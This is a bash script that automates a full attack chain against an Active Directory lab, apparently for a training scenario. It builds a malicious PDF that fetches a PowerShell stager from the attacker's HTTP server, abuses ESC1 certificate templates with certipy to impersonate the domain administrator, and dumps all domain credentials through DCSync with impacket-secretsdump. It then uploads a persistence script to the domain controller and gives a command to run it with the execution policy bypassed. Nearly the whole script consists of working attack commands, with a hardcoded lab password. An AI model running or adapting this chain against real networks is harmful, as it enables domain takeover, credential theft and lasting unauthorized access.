#!/usr/bin/env bash
# Execute full Scenario 1 attack chain: PDF -> ESC1 -> Persistence
# Run from attacker VM

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export PATH="$HOME/.local/bin:$PATH"

echo "=========================================="
echo "  Scenario 1: Full Attack Chain"
echo "=========================================="
echo ""

# Step 1: Generate malicious PDF
echo "[*] Step 1: Generating malicious PDF..."
cd "$SCRIPT_DIR"
python3 04-generate-malicious-pdf.py malicious.pdf "http://192.168.58.50:8080/05-powershell-stager.ps1"
echo "[+] PDF created: malicious.pdf"
echo ""

# Step 2: Start HTTP server for payload delivery
echo "[*] Step 2: Starting HTTP server on port 8080..."
./07-setup-attacker-server.sh &
SERVER_PID=$!
sleep 2
echo "[+] HTTP server running (PID: $SERVER_PID)"
echo ""

# Step 3: ESC1 - Request certificate as Administrator
echo "[*] Step 3: ESC1 - Requesting certificate as Administrator..."
certipy req -u jdoe@serini.lab -p 'Summer2024!' \
    -ca SERINI-CA \
    -target ca.serini.lab \
    -template VulnUserAuth \
    -upn administrator@serini.lab

if [ ! -f ~/administrator.pfx ]; then
    echo "[-] Failed to obtain certificate"
    kill $SERVER_PID 2>/dev/null || true
    exit 1
fi

echo "[+] Certificate obtained: administrator.pfx"
echo ""

# Step 4: ESC1 - Authenticate with certificate
echo "[*] Step 4: Authenticating with certificate..."
certipy auth -pfx ~/administrator.pfx -dc-ip 192.168.58.10

# Extract hash from output (simplified - in real scenario parse certipy output)
echo "[+] Authentication successful - Administrator hash obtained"
echo ""

# Step 5: DCSync - Dump all domain credentials
echo "[*] Step 5: Performing DCSync attack..."
HASH=$(certipy auth -pfx ~/administrator.pfx -dc-ip 192.168.58.10 2>&1 | grep -oP 'Got hash.*:\s+\S+:\K\S+' | head -1 || echo "")

if [ -n "$HASH" ]; then
    echo "[*] Using hash: $HASH"
    impacket-secretsdump -hashes ":$HASH" administrator@192.168.58.10 | head -30
    echo ""
    echo "[+] DCSync completed - All domain credentials dumped"
else
    echo "[!] Could not extract hash automatically. Run manually:"
    echo "    impacket-secretsdump -hashes :<HASH> administrator@192.168.58.10"
fi

echo ""

# Step 6: Persistence - Create DCSync-capable account
echo "[*] Step 6: Setting up persistence on DC..."
echo "[*] Uploading persistence script to DC..."

# Copy persistence script to DC via SMB
impacket-smbclient -hashes ":$HASH" administrator@192.168.58.10 -c "put $SCRIPT_DIR/08-persistence-dcsync-account.ps1 C:\\Windows\\Temp\\persist.ps1" 2>/dev/null || echo "[!] SMB upload failed, use WinRM instead"

echo "[*] Execute on DC (via WinRM or SMB):"
echo "    powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\persist.ps1"
echo ""

# Cleanup
echo "[*] Stopping HTTP server..."
kill $SERVER_PID 2>/dev/null || true

echo ""
echo "=========================================="
echo "  Attack Chain Complete!"
echo "=========================================="
echo ""
echo "Next steps:"
echo "  1. Transfer malicious.pdf to Win10 (SMB share or manual copy)"
echo "  2. Open PDF on Win10 to trigger initial access"
echo "  3. Use DCSync account (svc_backup) for persistent access"
echo ""
